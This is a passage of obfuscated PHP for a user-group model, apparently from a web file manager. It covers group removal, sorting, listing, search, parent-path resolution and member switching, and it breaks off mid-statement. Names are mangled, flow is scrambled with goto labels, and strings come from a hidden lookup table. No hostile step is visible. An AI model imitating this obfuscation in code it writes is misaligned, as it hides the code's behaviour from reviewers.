$BÂ±¡ÓŞÙÓ = array(); goto B›ßöÁÁ«¸; A‰Ÿâ×ÑŸ: $A×œÚ¬¤ãÆ =& $_SERVER[Ç³Íß¦Ó]; $b»‰¤íµ = $this->getInfoSimple($Dší½ØŸ˜); if (!$b»‰¤íµ) { return !1; } goto dÛëÑ“¹ƒ•; B­¿•å‘Áó: } protected function groupRemove($A‘’Ôß”‹) { goto f§Ş©ÙË; f§Ş©ÙË: $D¢ŠïŠ«ğá =& $_SERVER[Ç³Íß¦Ó]; $CîÖœÏ ëÁ = array($D¢ŠïŠ«ğá[1689] => $A‘’Ôß”‹); $fÉøøéğÆ = $this->where($CîÖœÏ ëÁ)->find(); goto fÚ‡Ü›¼»š; fÚ‡Ü›¼»š: if (!$fÉøøéğÆ || $fÉøøéğÆ[$D¢ŠïŠ«ğá[476]] == 0) { return !1; } $E¡¸È½¶‹œ = $this->getInfoSimple($fÉøøéğÆ[$D¢ŠïŠ«ğá[476]]); $this->_changeChildLevel($fÉøøéğÆ, $E¡¸È½¶‹œ, !0); goto fÇ—ïêÕŞ; fÇ—ïêÕŞ: $this->where(array($D¢ŠïŠ«ğá[476] => $A‘’Ôß”‹))->save(array($D¢ŠïŠ«ğá[476] => $fÉøøéğÆ[$D¢ŠïŠ«ğá[476]])); Model($D¢ŠïŠ«ğá[1769])->where($CîÖœÏ ëÁ)->delete(); Model($D¢ŠïŠ«ğá[1770])->where($CîÖœÏ ëÁ)->delete(); goto eÚšÀ´¾­Ù; eÚšÀ´¾­Ù: Model($D¢ŠïŠ«ğá[791])->groupRootRemove($A‘’Ôß”‹); return $this->where($CîÖœÏ ëÁ)->delete(); goto FŸßÛŸé; FŸßÛŸé: } protected function groupSort($d¾ä¯“ÔÖÊ) { $CÉ¹¸©ºñ =& $_SERVER[Ç³Íß¦Ó]; $EÅ’ˆğ¡¾Ø = array(); foreach ($d¾ä¯“ÔÖÊ as $bëë×òßÂ => $bĞ™ŒŒÍ½°) { $EÅ’ˆğ¡¾Ø[] = array($CÉ¹¸©ºñ[1689], $bĞ™ŒŒÍ½°, $CÉ¹¸©ºñ[1712], $bëë×òßÂ + 1); } $this->saveAll($EÅ’ˆğ¡¾Ø); } public function listData() { $B¦ˆøŠ¡ˆ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($B¦ˆøŠ¡ˆ[$_SERVER[Ç³Íß¦Ó][366]]); return $B¦ˆøŠ¡ˆ; } private function _makeOrder($aÒÇÙƒ‹¨Ù = '') { goto eÃ’²ë¨¨¶; DİÀÅ¯²„Ò: $aÒÇÙƒ‹¨Ù = $aÒÇÙƒ‹¨Ù . "{$cîŸ¡¢ê“Ó}\40{$CŸ¢›Æùõ}\54\x20\147\162\157\165\160\x49\104\x20\x61\x73\143"; return $this->order($aÒÇÙƒ‹¨Ù); goto b‡‚“’Ì™; F®Ö¨ÆÃ²: $cîŸ¡¢ê“Ó = Input::get($b­Ì¯©é¨Á[433], $b­Ì¯©é¨Á[7], $b­Ì¯©é¨Á[1693], $Açóö²‡›Â); $CŸ¢›Æùõ = Input::get($b­Ì¯©é¨Á[434], $b­Ì¯©é¨Á[7], $b­Ì¯©é¨Á[1771], array($b­Ì¯©é¨Á[1771], $b­Ì¯©é¨Á[428])); $CŸ¢›Æùõ = $F½ë¾àæ¡Û[$CŸ¢›Æùõ]; goto DİÀÅ¯²„Ò; eÃ’²ë¨¨¶: $b­Ì¯©é¨Á =& $_SERVER[Ç³Íß¦Ó]; $Açóö²‡›Â = array($b­Ì¯©é¨Á[1689], $b­Ì¯©é¨Á[28], $b­Ì¯©é¨Á[1675], $b­Ì¯©é¨Á[193]); $F½ë¾àæ¡Û = array($b­Ì¯©é¨Á[426] => $b­Ì¯©é¨Á[427], $b­Ì¯©é¨Á[428] => $b­Ì¯©é¨Á[429]); goto F®Ö¨ÆÃ²; b‡‚“’Ì™: } public function listChild($Eëè†ò›âî) { $C›Ñ¹œöÎÖ =& $_SERVER[Ç³Íß¦Ó]; $cÍ¢¬ÂÓÄƒ = $this->where(array($C›Ñ¹œöÎÖ[476] => $Eëè†ò›âî))->_makeOrder()->selectPage(200); $this->_listDataApply($cÍ¢¬ÂÓÄƒ[$C›Ñ¹œöÎÖ[366]]); return $cÍ¢¬ÂÓÄƒ; } public function listByID($A–“•¶ˆº) { $aœ¥”ËÙ”‡ =& $_SERVER[Ç³Íß¦Ó]; if (!$A–“•¶ˆº) { return array(); } $c‡ê“¡±¯ = array($aœ¥”ËÙ”‡[1689] => array($aœ¥”ËÙ”‡[7], $A–“•¶ˆº)); $FŞïÍèÉâä = $this->where($c‡ê“¡±¯)->select(); $this->_listDataApply($FŞïÍèÉâä); return $FŞïÍèÉâä; } public function listSearch($aà½©×¨‘İ) { goto bÈ¦¤´Öò; CŸ†ÀåÅÙ: if (!trim($d±Åøà£•õ)) { return !1; } $d±Åøà£•õ = str_replace($aˆ¨òˆÅ·[1774], $aˆ¨òˆÅ·[1775], $d±Åøà£•õ); $FÄÒ‚‡¶öÙ = array($aˆ¨òˆÅ·[1689] => array($aˆ¨òˆÅ·[379], "{$d±Åøà£•õ}\45"), $aˆ¨òˆÅ·[28] => array($aˆ¨òˆÅ·[379], "\45{$d±Åøà£•õ}\45"), $aˆ¨òˆÅ·[957] => $aˆ¨òˆÅ·[1776]); goto b‡âœäå¤; B°ÂÙñ·: $EŸ´à×Ë™â = $EŸ´à×Ë™â ? $EŸ´à×Ë™â : array($aˆ¨òˆÅ·[366] => array(), $aˆ¨òˆÅ·[363] => array()); if (!$EŸ´à×Ë™â || count($EŸ´à×Ë™â[$aˆ¨òˆÅ·[366]]) < 5 && Input::check($d±Åøà£•õ, $aˆ¨òˆÅ·[315])) { goto cšÌä£¹ê¹; eï˜èñê“Ó: $bÍöŠ–éÜÉ = array_merge($a’‰Ø… ¸, $dš£ëòéÅÒ, $EŸ´à×Ë™â[$aˆ¨òˆÅ·[366]]); $EŸ´à×Ë™â[$aˆ¨òˆÅ·[366]] = array_unique_by_key($bÍöŠ–éÜÉ, $aˆ¨òˆÅ·[1689]); $EŸ´à×Ë™â[$aˆ¨òˆÅ·[363]][$aˆ¨òˆÅ·[364]] = count($EŸ´à×Ë™â[$aˆ¨òˆÅ·[366]]); goto f³Ë†Û±Úµ; f³Ë†Û±Úµ: $EŸ´à×Ë™â[$aˆ¨òˆÅ·[363]][$aˆ¨òˆÅ·[365]] = ceil($EŸ´à×Ë™â[$aˆ¨òˆÅ·[363]][$aˆ¨òˆÅ·[364]] / $EŸ´à×Ë™â[$aˆ¨òˆÅ·[363]][$aˆ¨òˆÅ·[360]]); goto e¹è¬º–Á‚; cšÌä£¹ê¹: $f–ôÅê¼¢ = $this->groupChildrenAll($cµ“Í©á×É); $a’‰Ø… ¸ = $this->_searchFromMeta($aˆ¨òˆÅ·[441], $d±Åøà£•õ, 10, $f–ôÅê¼¢); $dš£ëòéÅÒ = $this->_searchFromMeta($aˆ¨òˆÅ·[442], $d±Åøà£•õ, 10, $f–ôÅê¼¢); goto eï˜èñê“Ó; e¹è¬º–Á‚: } $this->_listDataApply($EŸ´à×Ë™â[$aˆ¨òˆÅ·[366]]); goto Fæ¿Ï‰ÆÚ; bÈ¦¤´Öò: $aˆ¨òˆÅ· =& $_SERVER[Ç³Íß¦Ó]; $d±Åøà£•õ = $aà½©×¨‘İ[$aˆ¨òˆÅ·[1772]]; $cµ“Í©á×É = isset($aà½©×¨‘İ[$aˆ¨òˆÅ·[1773]]) ? $aà½©×¨‘İ[$aˆ¨òˆÅ·[1773]] : !1; goto CŸ†ÀåÅÙ; Fæ¿Ï‰ÆÚ: return $EŸ´à×Ë™â; goto eâÓóÀÖ; b‡âœäå¤: if ($cµ“Í©á×É) { $F‰Ê…»«›º = $this->getInfoSimple($cµ“Í©á×É); $E©—Š‡ÂÂ’ = $F‰Ê…»«›º[$aˆ¨òˆÅ·[485]] . $cµ“Í©á×É . $aˆ¨òˆÅ·[512]; $FÄÒ‚‡¶öÙ = array($FÄÒ‚‡¶öÙ, array($aˆ¨òˆÅ·[485] => array($aˆ¨òˆÅ·[379], $E©—Š‡ÂÂ’))); } $FÄÒ‚‡¶öÙ = $this->parseWhereLike($FÄÒ‚‡¶öÙ); $EŸ´à×Ë™â = $this->_makeOrder()->where($FÄÒ‚‡¶öÙ)->selectPage(20); goto B°ÂÙñ·; eâÓóÀÖ: } protected function groupChildrenAll($dâ‘¨ÚÌîÑ) { $cŒ‘‹ó®êÌ =& $_SERVER[Ç³Íß¦Ó]; if (!$dâ‘¨ÚÌîÑ) { return !1; } if (is_string($dâ‘¨ÚÌîÑ)) { $dâ‘¨ÚÌîÑ = array($dâ‘¨ÚÌîÑ); } $d¥Šˆ—„»è = $dâ‘¨ÚÌîÑ; foreach ($dâ‘¨ÚÌîÑ as $AÑÕŞ‚‚¬±) { $D¾Íç¿ó¢é = $this->getInfoSimple($AÑÕŞ‚‚¬±); $aÒÏ‰‘ ìà = array($cŒ‘‹ó®êÌ[485] => array($cŒ‘‹ó®êÌ[379], $D¾Íç¿ó¢é[$cŒ‘‹ó®êÌ[485]] . $AÑÕŞ‚‚¬± . $cŒ‘‹ó®êÌ[512])); $bê™Ë§—åŒ = $this->field($cŒ‘‹ó®êÌ[1689])->where($aÒÏ‰‘ ìà)->select(); $d¥Šˆ—„»è = array_merge($d¥Šˆ—„»è, array_to_keyvalue($bê™Ë§—åŒ, $cŒ‘‹ó®êÌ[33], $cŒ‘‹ó®êÌ[1689])); } return array_unique($d¥Šˆ—„»è); } private function _searchFromMeta($B‚¥Ôê®Š·, $D¬ñäÚåğÕ, $f«÷›—…, $Dö½ó×ì•²) { goto E©Å´ööÉ; Dø®¢„î×­: if (!$AÚö½ÓîÊ) { return array(); } return $AÚö½ÓîÊ; goto f™ã…‘ß¯; fèÚ­‹•ã: $Eˆ´Èí·“ = $this->parseWhereLike($Eˆ´Èí·“); if ($Dö½ó×ì•²) { $Eˆ´Èí·“[$a¬âôÒøÕ[1689]] = array($a¬âôÒøÕ[7], $Dö½ó×ì•²); } $aÍ¯À¤æœ­ = Model($a¬âôÒøÕ[1777])->where($Eˆ´Èí·“)->limit($f«÷›—…)->select(); goto eŒĞÊÙôº²; E©Å´ööÉ: $a¬âôÒøÕ =& $_SERVER[Ç³Íß¦Ó]; $D¬ñäÚåğÕ = strtolower($D¬ñäÚåğÕ); $Eˆ´Èí·“ = array($a¬âôÒøÕ[93] => $B‚¥Ôê®Š·, $a¬âôÒøÕ[371] => array($a¬âôÒøÕ[379], "\x25{$D¬ñäÚåğÕ}\x25")); goto fèÚ­‹•ã; eŒĞÊÙôº²: if (!$aÍ¯À¤æœ­) { return array(); } $aÍ¯À¤æœ­ = array_to_keyvalue($aÍ¯À¤æœ­, $a¬âôÒøÕ[33], $a¬âôÒøÕ[1689]); $AÚö½ÓîÊ = $this->where(array($a¬âôÒøÕ[1767] => array($a¬âôÒøÕ[7], $aÍ¯À¤æœ­)))->select(); goto Dø®¢„î×­; f™ã…‘ß¯: } protected function _listDataApplyItem($E¾ã–‹‰¹¶) { $dŸ¨ ¤ç¦â = array($E¾ã–‹‰¹¶); $this->_listDataApply($dŸ¨ ¤ç¦â); return $dŸ¨ ¤ç¦â[0]; } protected function _listDataApply(&$CñÚßƒáÏß) { goto CŞÚªÛ¢‘‰; CŞÚªÛ¢‘‰: $c˜ğ™›Ñ¯ =& $_SERVER[Ç³Íß¦Ó]; if (!$CñÚßƒáÏß) { return; } $D¸šÀŠ½„¡ = array_to_keyvalue($CñÚßƒáÏß, $c˜ğ™›Ñ¯[33], $c˜ğ™›Ñ¯[1689]); goto dİ„øÄ„‹; dİ„øÄ„‹: $this->_listAppendChildren($CñÚßƒáÏß); $this->_listAppendChildrenMember($CñÚßƒáÏß); $this->_listAppendMeta($CñÚßƒáÏß, $D¸šÀŠ½„¡); goto dÖ·¦¬µ; dÖ·¦¬µ: $this->_listAppendParent($CñÚßƒáÏß); $this->_listAppendSourceRoot($CñÚßƒáÏß, $D¸šÀŠ½„¡); goto c•“©à‰£; c•“©à‰£: } private function _listAppendChildren(&$D¨£®¬ã²Û) { goto Fğ¯î»©ò¨; Bâ×Û£¶ŠÆ: foreach ($D¨£®¬ã²Û as &$fØĞ×ƒ¦‹) { $f‰ Ğš¬ËÅ = $fØĞ×ƒ¦‹[$E›·ËÊÚ‚[1689]]; $fØĞ×ƒ¦‹[$E›·ËÊÚ‚[1779]] = isset($E…Áæ”£¼º[$f‰ Ğš¬ËÅ]) ? intval($E…Áæ”£¼º[$f‰ Ğš¬ËÅ]) : !1; } unset($fØĞ×ƒ¦‹); goto cÍìö†õèè; Fğ¯î»©ò¨: $E›·ËÊÚ‚ =& $_SERVER[Ç³Íß¦Ó]; $DŠ•Ó‹”š = array_to_keyvalue($D¨£®¬ã²Û, $E›·ËÊÚ‚[33], $E›·ËÊÚ‚[1689]); $dÒóŸ‡ÄåÀ = array($E›·ËÊÚ‚[476] => array($E›·ËÊÚ‚[7], $DŠ•Ó‹”š)); goto fŞºİ¿½Û§; fŞºİ¿½Û§: $Aªí‚‚Àˆ° = array($E›·ËÊÚ‚[476], $E›·ËÊÚ‚[1778] => $E›·ËÊÚ‚[478]); $fù”Ü¤„õˆ = $this->field($Aªí‚‚Àˆ°)->where($dÒóŸ‡ÄåÀ)->group($E›·ËÊÚ‚[476])->select(); $E…Áæ”£¼º = array_to_keyvalue($fù”Ü¤„õˆ, $E›·ËÊÚ‚[476], $E›·ËÊÚ‚[478]); goto Bâ×Û£¶ŠÆ; cÍìö†õèè: } private function _listAppendChildrenMember(&$A’„ÊßçÌ) { goto a¹åøäåÕ; aÉÎ¾…æË: foreach ($A’„ÊßçÌ as &$EÒÍáÆĞ«) { $CÊÜç¿ãÚ¥ = $EÒÍáÆĞ«[$f§í­¡Ïù«[1689]]; $EÒÍáÆĞ«[$f§í­¡Ïù«[1780]] = isset($Aöå˜ö‰»•[$CÊÜç¿ãÚ¥]) ? intval($Aöå˜ö‰»•[$CÊÜç¿ãÚ¥]) : !1; } unset($EÒÍáÆĞ«); goto Cµ­ëâƒæ‚; D¦¢‚Á¤Ï­: $CªŸó÷’›à = array($f§í­¡Ïù«[1689], $f§í­¡Ïù«[1778] => $f§í­¡Ïù«[478]); $dÎ¨Á‡Å±à = Model($f§í­¡Ïù«[1770])->field($CªŸó÷’›à)->where($e…±ÕöÀ¼Ì)->group($f§í­¡Ïù«[1689])->select(); $Aöå˜ö‰»• = array_to_keyvalue($dÎ¨Á‡Å±à, $f§í­¡Ïù«[1689], $f§í­¡Ïù«[478]); goto aÉÎ¾…æË; a¹åøäåÕ: $f§í­¡Ïù« =& $_SERVER[Ç³Íß¦Ó]; $f´é‹äŞ’¦ = array_to_keyvalue($A’„ÊßçÌ, $f§í­¡Ïù«[33], $f§í­¡Ïù«[1689]); $e…±ÕöÀ¼Ì = array($f§í­¡Ïù«[1689] => array($f§í­¡Ïù«[7], $f´é‹äŞ’¦)); goto D¦¢‚Á¤Ï­; Cµ­ëâƒæ‚: } private function _listAppendMeta(&$B„ÍŒÉ†›, $cëá…Ä) { goto Dä„ÌéÁù; F§òÀ©¬Äù: $e­“Ä ¾Éƒ = array_to_keyvalue_group($e­“Ä ¾Éƒ, $B¦šì‘¯½ì[1689]); foreach ($e­“Ä ¾Éƒ as &$c–±Íİ³ñù) { $c–±Íİ³ñù = array_to_keyvalue($c–±Íİ³ñù, $B¦šì‘¯½ì[93], $B¦šì‘¯½ì[371]); } unset($c–±Íİ³ñù); goto EªõÃÄÄï; Dä„ÌéÁù: $B¦šì‘¯½ì =& $_SERVER[Ç³Íß¦Ó]; $B›×Ã‡ñÅƒ = array($B¦šì‘¯½ì[1689] => array($B¦šì‘¯½ì[7], $cëá…Ä)); $e­“Ä ¾Éƒ = Model($B¦šì‘¯½ì[1769])->where($B›×Ã‡ñÅƒ)->select(); goto F§òÀ©¬Äù; EªõÃÄÄï: foreach ($B„ÍŒÉ†› as &$e”Ä§…±Æµ) { $e”Ä§…±Æµ[$B¦šì‘¯½ì[443]] = array(); if (isset($e­“Ä ¾Éƒ[$e”Ä§…±Æµ[$B¦šì‘¯½ì[1689]]])) { $e”Ä§…±Æµ[$B¦šì‘¯½ì[443]] = $e­“Ä ¾Éƒ[$e”Ä§…±Æµ[$B¦šì‘¯½ì[1689]]]; } } unset($e”Ä§…±Æµ); goto d‰¸©´¾Ã; d‰¸©´¾Ã: } protected function parentLevelArray($aĞñ÷°‹†¾) { $fì‚—ÖéŠ =& $_SERVER[Ç³Íß¦Ó]; $aĞñ÷°‹†¾ = explode($fì‚—ÖéŠ[47], trim($aĞñ÷°‹†¾, $fì‚—ÖéŠ[47])); $aĞñ÷°‹†¾ = array_remove_value($aĞñ÷°‹†¾, $fì‚—ÖéŠ[495]); return $aĞñ÷°‹†¾; } private function _listAppendParent(&$FÁ¼…ğÔ) { goto E‚ïÀ­‚É¶; E‚ïÀ­‚É¶: $eŞ·Äâ…³¿ =& $_SERVER[Ç³Íß¦Ó]; $B×Õ·ç¶° = array(); foreach ($FÁ¼…ğÔ as &$eÅçê‚Ì¾–) { $B×Õ·ç¶°[$eÅçê‚Ì¾–[$eŞ·Äâ…³¿[1689]]] = $eÅçê‚Ì¾–[$eŞ·Äâ…³¿[28]]; $Bâ×ƒò®ÃÒ = $this->parentLevelArray($eÅçê‚Ì¾–[$eŞ·Äâ…³¿[485]]); foreach ($Bâ×ƒò®ÃÒ as $B–˜Ÿ¨İ„) { if (!isset($B×Õ·ç¶°[$B–˜Ÿ¨İ„])) { $B×Õ·ç¶°[$B–˜Ÿ¨İ„] = 0; } } } goto FÅØ…Ã•ù; FÅØ…Ã•ù: unset($eÅçê‚Ì¾–); foreach ($B×Õ·ç¶° as $Fö„°Š¦ç„ => $eôÑ°¼ïéœ) { if ($eôÑ°¼ïéœ) { continue; } $F¹ŞÀñùå = $this->getInfoSimple($Fö„°Š¦ç„); $B×Õ·ç¶°[$Fö„°Š¦ç„] = $F¹ŞÀñùå[$eŞ·Äâ…³¿[28]]; } $C®ÃƒÎÂ…Å = $GLOBALS[$eŞ·Äâ…³¿[6]][$eŞ·Äâ…³¿[88]][$eŞ·Äâ…³¿[1781]]; goto cÁÚ¼ìÌ; cÁÚ¼ìÌ: if ($GLOBALS[$eŞ·Äâ…³¿[483]] == $eŞ·Äâ…³¿[87]) { $C®ÃƒÎÂ…Å = !1; } foreach ($FÁ¼…ğÔ as &$eÅçê‚Ì¾–) { $Bâ×ƒò®ÃÒ = $this->parentLevelArray($eÅçê‚Ì¾–[$eŞ·Äâ…³¿[485]]); $c¡›«¯ÌÄ = $eŞ·Äâ…³¿[33]; foreach ($Bâ×ƒò®ÃÒ as $Fö„°Š¦ç„ => $B–˜Ÿ¨İ„) { if ($C®ÃƒÎÂ…Å && $Fö„°Š¦ç„ == 0) { continue; } $c¡›«¯ÌÄ .= $B×Õ·ç¶°[$B–˜Ÿ¨İ„] . $eŞ·Äâ…³¿[8]; } if ($Bâ×ƒò®ÃÒ) { $c¡›«¯ÌÄ .= $eÅçê‚Ì¾–[$eŞ·Äâ…³¿[28]]; } $eÅçê‚Ì¾–[$eŞ·Äâ…³¿[489]] = str_replace($eŞ·Äâ…³¿[494], $eŞ·Äâ…³¿[8], $c¡›«¯ÌÄ); } unset($eÅçê‚Ì¾–); goto Dìä´Üå; Dìä´Üå: } private function _listAppendSourceRoot(&$e¡ŸÆˆ«, $Bå£ˆ—éÚÙ) { goto béÌ¬‹Úò“; bŒ¹Ÿˆíì: foreach ($e¡ŸÆˆ« as &$AÅá·†ÉÉ) { $AÅá·†ÉÉ[$bùÒ¤äŞ„“[85]] = $aãŒ¯£ö…”[$AÅá·†ÉÉ[$bùÒ¤äŞ„“[1689]]] ? $aãŒ¯£ö…”[$AÅá·†ÉÉ[$bùÒ¤äŞ„“[1689]]] : array(); } unset($AÅá·†ÉÉ); goto e²¤¸õŒÎ ; béÌ¬‹Úò“: $bùÒ¤äŞ„“ =& $_SERVER[Ç³Íß¦Ó]; $EõÛ×Å’‘ = array($bùÒ¤äŞ„“[402] => SourceModel::TYPE_GROUP, $bùÒ¤äŞ„“[476] => 0, $bùÒ¤äŞ„“[482] => array($bùÒ¤äŞ„“[7], $Bå£ˆ—éÚÙ)); $d±¶š§‡ğ¸ = $bùÒ¤äŞ„“[1782]; goto BùáéÆ‚ø; BùáéÆ‚ø: $aãŒ¯£ö…” = Model($bùÒ¤äŞ„“[791])->order($bùÒ¤äŞ„“[1783])->field($d±¶š§‡ğ¸)->where($EõÛ×Å’‘)->select(); $aãŒ¯£ö…” = array_to_keyvalue($aãŒ¯£ö…”, $bùÒ¤äŞ„“[482]); $aãŒ¯£ö…” = array_remove_key($aãŒ¯£ö…”, $bùÒ¤äŞ„“[482]); goto bŒ¹Ÿˆíì; e²¤¸õŒÎ : } protected function groupMerge($DªÔ¾§ï™ˆ) { $DªÔ¾§ï™ˆ = array_values(array_unique($DªÔ¾§ï™ˆ)); $E¼ˆÜˆãÄ‘ = array(); for ($EÖĞÆ›¡ï× = 0; $EÖĞÆ›¡ï× < count($DªÔ¾§ï™ˆ); $EÖĞÆ›¡ï×++) { $f³«îÒŞÇ¯ = !1; for ($dãŸÏ†é­ = 0; $dãŸÏ†é­ < count($DªÔ¾§ï™ˆ); $dãŸÏ†é­++) { if ($EÖĞÆ›¡ï× == $dãŸÏ†é­) { continue; } if ($this->isParentOf($DªÔ¾§ï™ˆ[$dãŸÏ†é­], $DªÔ¾§ï™ˆ[$EÖĞÆ›¡ï×])) { $f³«îÒŞÇ¯ = !0; break; } } if (!$f³«îÒŞÇ¯) { $E¼ˆÜˆãÄ‘[] = $DªÔ¾§ï™ˆ[$EÖĞÆ›¡ï×]; } } return $E¼ˆÜˆãÄ‘; } protected function isParentOf($BÚØÕ†®¡¡, $CÈ®˜ä·ÃĞ) { goto Aåó˜¡µğ; BëÏ˜ÉÍêè: $Eæíò‚  Œ = $this->getInfoSimple($CÈ®˜ä·ÃĞ); $D£ì¶æåªÒ = $e›ÌÉË‰[$Fğ‚àá£à[485]] . $BÚØÕ†®¡¡ . $Fğ‚àá£à[47]; if (substr($Eæíò‚  Œ[$Fğ‚àá£à[485]], 0, strlen($D£ì¶æåªÒ)) == $D£ì¶æåªÒ) { return !0; } goto fİäÒíÇ®; fİäÒíÇ®: return !1; goto aàò¦âÂğŞ; Aåó˜¡µğ: $Fğ‚àá£à =& $_SERVER[Ç³Íß¦Ó]; if (!$BÚØÕ†®¡¡ || !$CÈ®˜ä·ÃĞ || $BÚØÕ†®¡¡ == $CÈ®˜ä·ÃĞ) { return !1; } $e›ÌÉË‰ = $this->getInfoSimple($BÚØÕ†®¡¡); goto BëÏ˜ÉÍêè; aàò¦âÂğŞ: } public function groupShowRoot($A‘Îøóâ·Ğ, $EŒÌŞ°¥¬‚ = false) { goto b–§ÂŸ„¹ù; b–§ÂŸ„¹ù: $Dë¾Ä’› =& $_SERVER[Ç³Íß¦Ó]; $A‹”óİ¾·é = $this->getInfo($A‘Îøóâ·Ğ); if (!$A‹”óİ¾·é) { return array(); } goto Bâ³’„ô; Fä‚œÓ÷è: if ($EŒÌŞ°¥¬‚ && count($Bà¸Àã‡”) == 1) { return $AÖ÷¨Ğ Ï; } if (!$A‹”óİ¾·é[$Dë¾Ä’›[443]] || !isset($A‹”óİ¾·é[$Dë¾Ä’›[443]][$Dë¾Ä’›[1765]]) || $A‹”óİ¾·é[$Dë¾Ä’›[443]][$Dë¾Ä’›[1765]] == $Dë¾Ä’›[1739]) { return $this->groupShowRoot($Bà¸Àã‡”[count($Bà¸Àã‡”) - 1], $EŒÌŞ°¥¬‚); } if ($A‹”óİ¾·é[$Dë¾Ä’›[443]][$Dë¾Ä’›[1765]] == $Dë¾Ä’›[356]) { $Bàß¶àÜÒÁ = explode($Dë¾Ä’›[47], $A‹”óİ¾·é[$Dë¾Ä’›[443]][$Dë¾Ä’›[1766]]); if ($Bàß¶àÜÒÁ) { $AÖ÷¨Ğ Ï = array_merge($AÖ÷¨Ğ Ï, $Bàß¶àÜÒÁ); } } goto càƒĞÚØ²ô; Bâ³’„ô: $Bà¸Àã‡” = $this->parentLevelArray($A‹”óİ¾·é[$Dë¾Ä’›[485]]); $AÖ÷¨Ğ Ï = array($A‘Îøóâ·Ğ); if (count($Bà¸Àã‡”) == 0) { return $AÖ÷¨Ğ Ï; } goto Fä‚œÓ÷è; càƒĞÚØ²ô: return $AÖ÷¨Ğ Ï; goto aèŠÀéè¤; aèŠÀéè¤: } protected function resetParentLevel() { $aöÍ‡‰œ´Ñ =& $_SERVER[Ç³Íß¦Ó]; $Dàë±©éŞš = $aöÍ‡‰œ´Ñ[1689]; $cÁÕ•ˆä¿ = $this->select(); $cÁÕ•ˆä¿ = array_to_keyvalue($cÁÕ•ˆä¿, $Dàë±©éŞš); foreach ($cÁÕ•ˆä¿ as $c­¿ó¢’¥¨) { goto A”ÖÏƒÍâ°; f‹•§±½Ãİ: $this->where(array($Dàë±©éŞš => $c­¿ó¢’¥¨[$Dàë±©éŞš]))->save(array($aöÍ‡‰œ´Ñ[552] => $BœÑ®†ƒô©)); goto Bññ‘º»öÆ; eŒ¸Ü²Ù°ó: $BœÑ®†ƒô©[] = 0; $BœÑ®†ƒô© = $aöÍ‡‰œ´Ñ[47] . implode($aöÍ‡‰œ´Ñ[47], array_reverse($BœÑ®†ƒô©)) . $aöÍ‡‰œ´Ñ[47]; $this->setNamePinyin($c­¿ó¢’¥¨[$Dàë±©éŞš], $c­¿ó¢’¥¨[$aöÍ‡‰œ´Ñ[28]]); goto f‹•§±½Ãİ; A”ÖÏƒÍâ°: $A“–”ô¿Úã = $c­¿ó¢’¥¨; $BœÑ®†ƒô© = array(); while ($A“–”ô¿Úã[$aöÍ‡‰œ´Ñ[476]] != 0) { $BœÑ®†ƒô©[] = $A“–”ô¿Úã[$aöÍ‡‰œ´Ñ[476]]; $A“–”ô¿Úã = $cÁÕ•ˆä¿[$A“–”ô¿Úã[$aöÍ‡‰œ´Ñ[476]]]; } goto eŒ¸Ü²Ù°ó; Bññ‘º»öÆ: } return $cÁÕ•ˆä¿; } public function groupNameAuto($d´—¼¾¥îƒ, $dÄã„º¦ç) { $E¢²ÄóÃï© =& $_SERVER[Ç³Íß¦Ó]; $d»îè°ÜÀ´ = $this->where(array($E¢²ÄóÃï©[393] => $d´—¼¾¥îƒ))->getField($E¢²ÄóÃï©[28], !0); if (!$d»îè°ÜÀ´ || !in_array($dÄã„º¦ç, $d»îè°ÜÀ´)) { return $dÄã„º¦ç; } for ($eĞØíÅ±ˆ‘ = 1; $eĞØíÅ±ˆ‘ <= count($d»îè°ÜÀ´) + 1; $eĞØíÅ±ˆ‘++) { $F÷Š‘óë‹Ô = $dÄã„º¦ç . "\50{$eĞØíÅ±ˆ‘}\51"; if (!in_array($F÷Š‘óë‹Ô, $d»îè°ÜÀ´)) { return $F÷Š‘óë‹Ô; } } } public function groupSwitch($f†ÒÖ‹ÂÇ, $DÙŒá¬‹‰…) { goto cì…í¯¸½; FÖöôğŒ„Ò: $dÒĞŒ£ŸÀß = array($DÉ œ¨ïË[402] => 2, $DÉ œ¨ïË[476] => 0, $DÉ œ¨ïË[401] => 1, $DÉ œ¨ïË[482] => array($DÉ œ¨ïË[7], array($f†ÒÖ‹ÂÇ, $DÙŒá¬‹‰…))); $C²ø‘…ùù = Model($DÉ œ¨ïË[791])->where($dÒĞŒ£ŸÀß)->field($DÉ œ¨ïË[1785])->select(); $C²ø‘…ùù = array_to_keyvalue($C²ø‘…ùù, $DÉ œ¨ïË[482], $DÉ œ¨ïË[394]); goto bä™“µßÏÁ; CœÑæ”Ü·: $EºªÊÜ¢ÏÁ = Model($DÉ œ¨ïË[1770])->where($dÒĞŒ£ŸÀß)->select(); if (!$EºªÊÜ¢ÏÁ) { $EºªÊÜ¢ÏÁ = array(); } foreach ($EºªÊÜ¢ÏÁ as $eÔíñš¤°Å) { $C××„Øª¤› = $eÔíñš¤°Å[$DÉ œ¨ïË[1526]]; $dÒĞŒ£ŸÀß = array($DÉ œ¨ïË[1526] => $C××„Øª¤›, $DÉ œ¨ïË[1689] => $DÙŒá¬‹‰…); $b”¹ôóÄµ’ = Model($DÉ œ¨ïË[1770])->where($dÒĞŒ£ŸÀß)->find(); if (!$b”¹ôóÄµ’) { $aù³‹ãˆ•õ = array($DÙŒá¬‹‰… => $eÔíñš¤°Å[$DÉ œ¨ïË[1784]]); Model($DÉ œ¨ïË[505])->userGroupAdd($C××„Øª¤›, $aù³‹ãˆ•õ); } Model($DÉ œ¨ïË[505])->userGroupRemove($C××„Øª¤›, $f†ÒÖ‹ÂÇ); } goto FÖöôğŒ„Ò; bä™“µßÏÁ: $DÆëğŒê = !empty($C²ø‘…ùù[$f†ÒÖ‹ÂÇ]) ? $C²ø‘…ùù[$f†ÒÖ‹ÂÇ] : !1; if ($DÆëğŒê) { goto fš‚†É†²¾; eŠ”’ÕËºå: foreach ($C²ø‘…ùù as $Aøİöš§˜Ğ) { $Bæ¥İ„İÆ = $Aøİöš§˜Ğ[$DÉ œ¨ïË[401]] == $DÉ œ¨ïË[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($DÉ œ¨ïË[791])->move($Aøİöš§˜Ğ[$DÉ œ¨ïË[394]], $dóòô…â¾´, $Bæ¥İ„İÆ); } Model($DÉ œ¨ïË[791])->moveClearAuth = !0; $dÒĞŒ£ŸÀß = array($DÉ œ¨ïË[402] => 2, $DÉ œ¨ïË[482] => $f†ÒÖ‹ÂÇ); goto CÂç‘¾õŞ; DÖ·œŠ¾©: $C²ø‘…ùù = Model($DÉ œ¨ïË[791])->where($dÒĞŒ£ŸÀß)->field($DÉ 